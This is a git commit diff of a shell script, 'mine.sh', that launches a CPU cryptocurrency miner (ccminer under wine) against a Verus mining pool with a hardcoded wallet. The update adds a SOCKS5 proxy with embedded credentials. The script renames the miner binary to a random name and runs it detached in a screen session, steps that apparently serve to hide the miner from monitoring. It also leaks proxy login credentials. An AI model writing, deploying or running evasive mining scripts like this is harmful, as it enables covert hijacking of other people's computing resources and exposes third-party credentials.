45b3d7a19bce1364a38b4119dac0f43475bc75f0
Cvayoyo <145971481+Cvayoyo@users.noreply.github.com>
2025-02-16 09:12:39 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,5 +1,6 @@
-chmod +x *
-cd ccminer_CPU_3.8.3
-random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter
-mv ccminer.exe $random_name.exe
-screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RV66gw7B2BsfrFeUZ65wVgxzDxRvuSqJnw.belotloh -p d=5 -t 4"
+chmod +x * 
+cd ccminer_CPU_3.8.3 
+proxy_url="socks5://mining_server_ayoyo:123456tujuh@54.219.244.160:6201" 
+random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
+mv ccminer.exe $random_name.exe 
+screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RV66gw7B2BsfrFeUZ65wVgxzDxRvuSqJnw.belotloh -p d=5 -t 4 --proxy=$proxy_url"
